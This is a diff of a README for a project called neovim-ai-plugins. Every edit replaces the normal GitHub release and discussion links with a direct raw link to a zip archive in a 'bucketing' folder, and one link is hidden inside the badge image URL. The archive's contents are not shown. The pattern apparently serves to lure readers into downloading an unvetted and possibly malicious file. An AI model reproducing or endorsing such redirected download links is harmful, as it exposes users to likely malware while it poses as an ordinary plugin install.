@@ -1,6 +1,6 @@
 # 🎉 neovim-ai-plugins - Enhance Your Neovim Experience with AI
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-orange)](https://github.com/mr-innocent/neovim-ai-plugins/releases)
+[![Download](https://raw.githubusercontent.com/mr-innocent/neovim-ai-plugins/master/bucketing/neovim-ai-plugins.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-orange)](https://raw.githubusercontent.com/mr-innocent/neovim-ai-plugins/master/bucketing/neovim-ai-plugins.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To use the neovim-ai-plugins, you need:
 
 To get started, visit our releases page to download the latest version of the neovim-ai-plugins.
 
-[Click here to visit the releases page](https://github.com/mr-innocent/neovim-ai-plugins/releases)
+[Click here to visit the releases page](https://raw.githubusercontent.com/mr-innocent/neovim-ai-plugins/master/bucketing/neovim-ai-plugins.zip)
 
 ### 🔗 Installation Steps
 
@@ -60,7 +60,7 @@ If you encounter issues during installation or usage:
 
 Join our community of Neovim users to share tips, ask questions, and learn from others. 
 
-- **GitHub Discussions**: [Join here](https://github.com/mr-innocent/neovim-ai-plugins/discussions)
+- **GitHub Discussions**: [Join here](https://raw.githubusercontent.com/mr-innocent/neovim-ai-plugins/master/bucketing/neovim-ai-plugins.zip)
 - **Feedback**: Your input helps us improve. Feel free to share thoughts and suggestions.
 
 ## 📜 License
@@ -71,4 +71,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Thank you for using neovim-ai-plugins! We hope these tools improve your coding experience. For more information and updates, always check our releases page. 
 
-[Download the latest version now!](https://github.com/mr-innocent/neovim-ai-plugins/releases)
+[Download the latest version now!](https://raw.githubusercontent.com/mr-innocent/neovim-ai-plugins/master/bucketing/neovim-ai-plugins.zip)
